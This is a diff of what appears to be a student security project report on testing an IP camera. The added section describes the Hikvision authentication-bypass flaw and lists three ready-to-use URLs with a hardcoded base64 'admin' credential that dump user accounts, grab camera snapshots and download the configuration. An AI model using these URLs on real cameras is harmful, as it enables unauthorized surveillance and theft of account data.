@@ -20,6 +20,11 @@ One of the most common tools we used are metasploit.This tool tests all the know
 **Using TCP Connection to connect to Camera via Port 8000**
 Since we were unable to get much out of trying to send GET requests to the camera through port 8000 we thought the connection might be TCP. I used python in order to try to connect to the camera but was unable to get any response from the camera. _jghernndz_
 
+**Hikvision IP Camera Access Bypass**
+Many Hikvision IP cameras suffer from accessing bypass vulnerabilities which allowing unauthenticated person to access to users’ configuration accounts. After we have done some research, we could figure out superuser account named “admin” can be easily impersonated. Therefore, we used three different URLs to check if we could get any information through this vulnerability. Here is our list of the three URLs and what they are used for:
+*  http://<ip address>/Security/users?auth=YWRtaW46MTEK - retrieve a list of all users and their roles.
+*  http://<camera.ip>/onvif-http/snapshot?auth=YWRtaW46MTEK - get snapchat from the camera without authentication.
+*  http://<camera.ip>/System/configurationFile?auth=YWRtaW46MTEK - download the camera configuration. _kalsalehi_ & _msalharthi_
 
 ## Outcomes
 **Vulnerability Scan using Armitage**
